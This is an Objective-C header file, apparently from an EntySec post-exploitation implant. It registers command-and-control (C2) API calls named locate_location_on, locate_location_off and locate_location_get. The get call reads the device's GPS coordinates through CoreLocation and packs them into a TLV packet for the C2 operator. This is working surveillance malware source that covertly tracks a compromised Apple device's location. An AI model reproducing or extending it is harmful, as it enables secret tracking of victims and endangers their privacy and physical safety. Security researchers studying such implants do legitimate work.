/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _LOCATE_H_
#define _LOCATE_H_

#import <objc/runtime.h>
#import <CoreLocation/CoreLocation.h>

#include <api.h>
#include <c2.h>
#include <tlv.h>
#include <tlv_types.h>

#define LOCATE_BASE 8

#define LOCATE_LOCATION_ON \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LOCATE_BASE, \
                       API_CALL)
#define LOCATE_LOCATION_OFF \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LOCATE_BASE, \
                       API_CALL + 1)
#define LOCATE_LOCATION_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       LOCATE_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_LONGITUDE TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE)
#define TLV_TYPE_LATITUDE  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, LOCATE_BASE, API_TYPE + 1)

tlv_pkt_t *locate_location_on(c2_t *c2)
{
    //[NSClassFromString(@"CLLocationManager") setLocationServicesEnabled:true];
    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

tlv_pkt_t *locate_location_off(c2_t *c2)
{
    //[NSClassFromString(@"CLLocationManager") setLocationServicesEnabled:false];
    return api_craft_tlv_pkt(API_CALL_SUCCESS);
}

tlv_pkt_t *locate_location_get(c2_t *c2)
{
    tlv_pkt_t *result;
    CLLocationManager *manager;
    CLLocation *location;
    CLLocationCoordinate2D coordinate;

    NSString *latitude;
    NSString *longitude;

    manager = [[CLLocationManager alloc] init];

    [manager startUpdatingLocation];
    location = [manager location];
    coordinate = [location coordinate];

    latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
    longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];

    result = api_craft_tlv_pkt(API_CALL_SUCCESS);

    tlv_pkt_add_string(result, TLV_TYPE_LATITUDE, (char *)[latitude UTF8String]);
    tlv_pkt_add_string(result, TLV_TYPE_LONGITUDE, (char *)[longitude UTF8String]);

    return result;
}

void register_locate_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, LOCATE_LOCATION_ON, locate_location_on);
    api_call_register(api_calls, LOCATE_LOCATION_OFF, locate_location_off);
    api_call_register(api_calls, LOCATE_LOCATION_GET, locate_location_get);
}

#endif